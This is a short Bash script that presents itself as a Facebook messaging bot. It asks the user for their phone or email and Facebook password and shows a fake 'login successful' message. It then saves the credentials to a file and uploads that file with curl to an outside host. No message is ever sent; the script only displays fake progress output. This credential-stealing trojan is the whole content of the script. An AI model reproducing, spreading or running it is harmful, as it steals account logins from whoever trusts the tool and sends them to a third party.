#!/bin/bash
clear

toilet -f shadow -F gay "    Bot FB"
echo """
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    <=  author : ./YONDAIME-09_X             =>
    <=  Team   : Indonesian Security Hunter  =>
    <=  Code   : Bash                        =>
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Thanks To :
      All Member ISH & My Friends :)""" | lolcat
date | lolcat
echo "Wellcome To Bot FB" | lolcat
echo "\033[94m~{Login ke Akun Anda Terlebih Dahulu}~"
sleep 1
echo "\033[92m"
read -p """
Nomer Telepon
Email:""" user ;
echo "\033[96m"
read -p "Password :" pass ;
echo  "~root[@]Sedang MasuK Ke Akun Anda" | lolcat
sleep 4
echo "~root[@]Berhasil Login √ " | lolcat
echo "menyimpan akses login anda..." | lolcat
echo "User: $user\nPass: $pass" >> File/User/akses.html;
sleep 2
curl -T File/User/akses.html http://tirupurjobs.net 
echo "\033[93m"
read -p "masukan pesan 1 :" pesan1 ;
read -p "masukan pesan 2 :" pesan2 ;
read -p "masukan pesan 3 :" pesan3 ;
read -p "masukab pesan 4 :" pesan4 ;
read -p "masukan pesan 5 :" pesan5 ;
echo "loading sendding to facebook.com..."
echo "pesan :$pesan1\n$pesan2\n$pesan3\n$pesan4\n$pesan5\n" >> File/Pesan.html
echo "\033[92m=>$pesan1"
sleep 1
echo "\033[93m=>$pesan2"
sleep 1
echo "\033[91m=>$pesan3"
sleep 1
echo "\033[96m=>$pesan4"
sleep 1
echo "\033[94m=>$pesan5"
sleep 1
echo "sukses!!" | lolcat
sleep 0.1
echo "menyimpan pesam anda"
exit


